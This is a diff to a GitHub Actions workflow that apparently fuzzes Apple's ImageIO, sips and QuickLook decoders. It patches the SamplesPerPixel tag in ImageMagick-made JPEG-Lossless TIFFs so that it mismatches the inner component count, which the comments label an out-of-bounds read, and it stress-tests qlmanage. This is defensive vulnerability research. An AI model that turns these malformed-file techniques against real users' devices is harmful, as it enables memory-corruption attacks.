@@ -32,12 +32,174 @@ jobs:
           # Check if libgmalloc is available
           ls -la /usr/lib/libgmalloc.dylib 2>/dev/null && echo "libgmalloc: AVAILABLE" || echo "libgmalloc: NOT FOUND"
 
-      - name: Generate corpus
+      - name: Generate corpus + reference JPEGL via ImageMagick
         run: |
           python dng_fuzzer.py --corpus
+
+          echo ""
+          echo "======================================================"
+          echo " Reference JPEGL: Generate via ImageMagick (convert)"
+          echo " Goal: produce a JPEGL bitstream Apple's decoder DOES"
+          echo " accept, then create SPP mismatch variants of it."
+          echo "======================================================"
+
+          # Check ImageMagick availability and JPEGL support
+          which magick 2>/dev/null && echo "magick: $(magick --version | head -1)" || \
+          which convert 2>/dev/null && echo "convert: $(convert --version | head -1)" || \
+          echo "ImageMagick: NOT FOUND"
+
+          python3 << 'PYEOF'
+          import subprocess, os, struct
+
+          def run(cmd, timeout=30):
+              r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+              return r.returncode, r.stdout, r.stderr
+
+          # Try to create a JPEGL TIFF via ImageMagick
+          # -compress Lossless = JPEG-Lossless (SOF3) in TIFF context
+          # -depth 8 = 8-bit samples
+          GRAY64 = '/tmp/ref_jpegl_gray_1spp.tiff'
+          RGB64  = '/tmp/ref_jpegl_rgb_3spp.tiff'
+
+          # ImageMagick xc:gray creates a uniform gray image
+          rc, out, err = run(f'magick -size 64x64 xc:gray50 -depth 8 -compress Lossless {GRAY64} 2>&1 || convert -size 64x64 xc:gray50 -depth 8 -compress Lossless {GRAY64} 2>&1')
+          print(f'gray JPEGL TIFF rc={rc}: {(out+err).strip()[:100]}')
+
+          rc, out, err = run(f'magick -size 64x64 xc:gray50 -colorspace RGB -depth 8 -compress Lossless {RGB64} 2>&1 || convert -size 64x64 xc:gray50 -colorspace RGB -depth 8 -compress Lossless {RGB64} 2>&1')
+          print(f'RGB  JPEGL TIFF rc={rc}: {(out+err).strip()[:100]}')
+
+          for path in [GRAY64, RGB64]:
+              if not os.path.exists(path):
+                  print(f'  {path}: NOT CREATED')
+                  continue
+              sz = os.path.getsize(path)
+              # Scan for JPEGL SOF3 marker (0xFFC3) to verify it's actually JPEGL
+              with open(path, 'rb') as f:
+                  data = f.read()
+              has_sof3 = b'\xff\xc3' in data
+              has_sof0 = b'\xff\xc0' in data
+              print(f'  {path}: {sz}B  SOF3={has_sof3}  SOF0={has_sof0}')
+
+          # Quick test: can sips decode the reference JPEGL TIFFs?
+          for path in [GRAY64, RGB64]:
+              if not os.path.exists(path):
+                  continue
+              r = subprocess.run(
+                  ['sips', '-g', 'format', '-g', 'pixelWidth', '-g', 'pixelHeight', '-g', 'samplesPerPixel', path],
+                  capture_output=True, text=True, timeout=10
+              )
+              print(f'  sips metadata {os.path.basename(path)}: rc={r.returncode}  {r.stdout.strip()[:120]}')
+          PYEOF
           echo ""
           echo "Generated corpus files:"
           ls -lah corpus/
+
+      - name: MUTATION - patch SPP in ImageMagick JPEGL TIFF to create mismatch
+        if: always()
+        continue-on-error: true
+        run: |
+          python3 << 'PYEOF'
+          import subprocess, os, struct
+
+          def patch_tiff_spp(src_path, dst_path, new_spp):
+              """
+              Patch SamplesPerPixel (tag 277) in a TIFF file without rebuilding.
+              Only works if SPP count==1 (inline value).
+              """
+              with open(src_path, 'rb') as f:
+                  data = bytearray(f.read())
+
+              # Detect byte order
+              if data[:2] == b'II':
+                  order = '<'
+              elif data[:2] == b'MM':
+                  order = '>'
+              else:
+                  print(f'Not a TIFF: {src_path}')
+                  return False
+
+              ifd_offset = struct.unpack_from(order + 'I', data, 4)[0]
+              n_entries = struct.unpack_from(order + 'H', data, ifd_offset)[0]
+              entry_base = ifd_offset + 2
+
+              for i in range(n_entries):
+                  off = entry_base + i * 12
+                  tag, typ, count = struct.unpack_from(order + 'HHI', data, off)
+                  if tag == 277:  # SamplesPerPixel
+                      if count == 1 and typ in (3, 4):  # SHORT or LONG, single value
+                          val_offset = off + 8
+                          if typ == 3:  # SHORT
+                              struct.pack_into(order + 'H', data, val_offset, new_spp)
+                              struct.pack_into(order + 'H', data, val_offset + 2, 0)
+                          else:  # LONG
+                              struct.pack_into(order + 'I', data, val_offset, new_spp)
+                          print(f'  Patched SPP: {tag}={new_spp} at offset {val_offset} in {src_path}')
+                          with open(dst_path, 'wb') as f:
+                              f.write(data)
+                          return True
+                      else:
+                          print(f'  SPP tag found but count={count} typ={typ}, cannot patch inline')
+                          return False
+              print(f'  SPP tag not found in {src_path}')
+              return False
+
+          # Reference JPEGL TIFFs created by ImageMagick
+          GRAY_REF = '/tmp/ref_jpegl_gray_1spp.tiff'
+
+          if not os.path.exists(GRAY_REF):
+              print('[SKIP] ImageMagick did not create reference JPEGL. Trying libtiff...')
+              # Try alternative: use tiffcp or tiff utility
+              rc = os.system('brew install libtiff 2>/dev/null')
+          else:
+              print(f'[OK] Reference JPEGL exists: {GRAY_REF} ({os.path.getsize(GRAY_REF)}B)')
+
+              # Test: can Swift CGImageSource decode the ImageMagick JPEGL?
+              import subprocess as sp
+              swift_code = '''
+          import Foundation, ImageIO, CoreGraphics
+          let url = URL(fileURLWithPath: "/tmp/ref_jpegl_gray_1spp.tiff") as CFURL
+          guard let src = CGImageSourceCreateWithURL(url, nil) else { print("NO_SRC"); exit(1) }
+          let uti = CGImageSourceGetType(src) as String? ?? "nil"
+          guard let img = CGImageSourceCreateImageAtIndex(src, 0, nil) else { print("NO_IMG uti=\\(uti)"); exit(1) }
+          let cs = CGColorSpaceCreateDeviceGray()
+          guard let ctx = CGContext(data: nil, width: img.width, height: img.height,
+              bitsPerComponent: 8, bytesPerRow: img.width, space: cs,
+              bitmapInfo: CGImageAlphaInfo.none.rawValue) else { print("NO_CTX"); exit(1) }
+          ctx.setFillColor(gray: 1.0, alpha: 1.0)
+          ctx.fill(CGRect(x:0,y:0,width:img.width,height:img.height))
+          ctx.draw(img, in: CGRect(x:0,y:0,width:img.width,height:img.height))
+          var px: UInt8 = 0
+          if let p = ctx.data { px = p.load(as: UInt8.self) }
+          let v = px == 255 ? "DRAW_FAILED" : (px >= 120 && px <= 136 ? "OK_MIDPOINT" : "px=\\(px)")
+          print("CGImg \\(uti) \\(img.width)x\\(img.height) \\(v)")
+          '''
+              open('/tmp/ref_jpegl_test.swift', 'w').write(swift_code)
+              r = sp.run(['swift', '/tmp/ref_jpegl_test.swift'],
+                         capture_output=True, text=True, timeout=30)
+              print(f'Reference JPEGL CGImageSource: {r.stdout.strip()} {r.stderr.strip()[:60]}')
+
+              # Now create mismatch variants: change SPP without changing inner JPEGL Nf
+              # Variant 1: SPP=3 outer, Nf=1 inner (OOB READ — spp > nf)
+              SPP3_PATH = '/tmp/ref_jpegl_mutated_3spp_1nf.tiff'
+              if patch_tiff_spp(GRAY_REF, SPP3_PATH, 3):
+                  r = sp.run(['swift', '/tmp/ref_jpegl_test.swift'.replace(
+                      'ref_jpegl_gray_1spp.tiff', 'ref_jpegl_mutated_3spp_1nf.tiff')],
+                      capture_output=True, text=True, timeout=30)
+                  # Quick test via a modified swift file
+                  swift_mut = swift_code.replace('ref_jpegl_gray_1spp.tiff', 'ref_jpegl_mutated_3spp_1nf.tiff')
+                  open('/tmp/ref_jpegl_mut.swift', 'w').write(swift_mut)
+                  r2 = sp.run(['swift', '/tmp/ref_jpegl_mut.swift'],
+                               capture_output=True, text=True, timeout=30)
+                  print(f'Mutated SPP=3 Nf=1: {r2.stdout.strip()} {r2.stderr.strip()[:60]}')
+
+                  # Also test via sips (look for crash/error)
+                  r3 = sp.run(
+                      ['sips', '-s', 'format', 'png', SPP3_PATH, '--out', '/tmp/mut_decode.png'],
+                      capture_output=True, text=True, timeout=20,
+                      env={**os.environ, 'MallocScribble': '1', 'MallocGuardEdges': '1'}
+                  )
+                  print(f'sips mutated SPP=3 Nf=1: rc={r3.returncode}  {r3.stderr.strip()[:80]}')
+          PYEOF
 
       - name: DIAGNOSTIC - file type and Swift CGImageSource (direct ImageIO)
         if: always()
@@ -197,6 +359,18 @@ jobs:
         if: always()
         run: |
           mkdir -p /tmp/ql_out
+          # Baseline: show what qlmanage creates for a known-good PNG (confirms thumbnail naming)
+          echo "--- qlmanage baseline on known-good PNG ---"
+          python3 -c "
+from PIL import Image
+img = Image.new('RGB', (64,64), (128,0,128))
+img.save('/tmp/known_good.png')
+" 2>/dev/null || convert -size 64x64 xc:purple /tmp/known_good.png 2>/dev/null || true
+          qlmanage -t -s 64 -o /tmp/ql_out /tmp/known_good.png 2>&1 || true
+          echo "--- /tmp/ql_out contents after known-good PNG ---"
+          ls -la /tmp/ql_out/ 2>/dev/null || echo "(empty)"
+          rm -f /tmp/ql_out/*.png  # clean for JPEGL tests
+          echo "---"
           python3 << 'PYEOF'
           import subprocess, os, glob, time
 
@@ -322,6 +496,9 @@ jobs:
               print('Next step: run with libgmalloc or AddressSanitizer build.')
           print("=" * 70)
           PYEOF
+          echo ""
+          echo "--- /tmp/ql_out contents (all qlmanage thumbnail outputs) ---"
+          ls -la /tmp/ql_out/ 2>/dev/null | head -40 || echo "(empty)"
 
       - name: STRESS - qlmanage extreme Nf targets (multi-MB OOB → page fault)
         if: always()
